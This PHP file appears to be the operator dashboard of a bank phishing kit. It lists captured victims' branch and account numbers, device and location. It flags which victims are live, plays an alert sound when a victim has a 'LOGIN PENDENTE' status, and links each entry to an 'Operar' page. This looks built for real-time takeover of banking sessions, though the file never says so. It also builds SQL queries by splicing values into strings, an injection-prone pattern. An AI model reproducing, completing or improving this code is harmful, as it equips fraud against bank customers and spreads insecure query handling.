<?php
require_once('../function.php');
require_once('../conexao.php');

if (!isset($_SESSION['nome_usu_sessao'])) :
    $_SESSION['msg'] = "<div class='alert alert-danger icons-alert'>
    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
    <i class='icofont icofont-close-line-circled'></i>
    </button>
    <p><strong>Erro!</strong> Você precisa autenticar primeiro para ver esta pagina.</p>
    </div>";
    header("Location: ./login.php");
    exit();
endif;

mysqli_select_db($ConnectDB, $database_ConnectDB);
$query_Cliente = sprintf("SELECT * FROM infos ORDER BY id DESC");
$Cliente = mysqli_query($ConnectDB, $query_Cliente);
$row_Cliente = mysqli_fetch_assoc($Cliente);
$totalRows_Cliente = mysqli_num_rows($Cliente);


$sql = mysqli_query($ConnectDB, "SELECT * FROM infos ORDER BY id DESC");

while ($row = mysqli_fetch_array($sql)) {

    ///////

    $id_client = $row['agencia'];
    //Obter a data atual
    $data['atual'] = date('Y-m-d H:i:s');

    //Diminuir 20 segundos 
    $data['online'] = strtotime($data['atual'] . " - 5 seconds");
    $data['online'] = date("Y-m-d H:i:s", $data['online']);

    //Pesquisar os ultimos usuarios online nos 20 segundo
    $result_qnt_visitas = "SELECT count(id) as online FROM visitas WHERE data_final >= '" . $data['online'] . "' and client_id='$id_client'";

    $resultado_qnt_visitas = mysqli_query($ConnectDB, $result_qnt_visitas);
    $row_qnt_visitas = mysqli_fetch_assoc($resultado_qnt_visitas);
    $row_qnt_visitas['online'];

    if ($row_qnt_visitas['online'] == '1') {
        //echo '<span class="label label-success font-weight-bold label-inline" >Online</span>';

        $verifica_online = 'online';
    } else {
        //echo '<span class="label label-danger font-weight-bold label-inline">Offline</span>';

        $verifica_online = 'offline';
        //exit;
    }

    ///////

    if ($verifica_online == 'online') {
        if ($row["comando"] == 'LOGIN PENDENTE') {
            echo '<audio id="audio" autoplay>
				<source src="./notification_sound.mp3" />
				</audio>';
        }
    }

    if (!empty($row["status"])) {
        $verificar_operador = '';
        $botao_operar = $row["status"];
    } else {
        $verificar_operador = '';
        $botao_operar = 'Operar';
    }

    if ($row['variacao'] == 'varejo') {
        $row['variacao'] = 'classic';
        # code...
    }

?>

    <tr class="header visualizado" data-aberto="0" data-id="7">
        <td scope="row"><?php print $row["id"]; ?></td>
        <td style="text-transform: uppercase;"><?php print $row["estado"]; ?> - <?php print $row["cidade"]; ?></td>
        <td><?php print $row["datahora"]; ?></td>
        <td style="text-transform: uppercase;"><?php print $row["dispositivo"]; ?></td>
        <td><?php print $row["agencia"]; ?></td>
        <td><?php print $row["conta"]; ?></td>
        <td style="text-transform: uppercase;"><?php print $row['variacao']; ?></td>
        <td style="text-transform: uppercase;"><span class="status <?php print $verifica_online; ?>"><?php print $verifica_online; ?></span></td>
        <td style="text-transform: uppercase;"><?php print $row["comando"]; ?></td>
        <td class="text-center">
            <a target="_blank" href="./cliente.php?id=<?php print $row["id"]; ?>&app=<?php print $row["tipo_conta"]; ?>"><button <?php print $verificar_operador; ?> id="operarbotao" style="font-size:11px;" type="button" class="btn btn-operar btn-outline-dark btn-sm excluir-info"><i class="fas fa-tools"></i> <?php print $botao_operar; ?></button></a>
        </td>
    </tr>
<?php
}
?>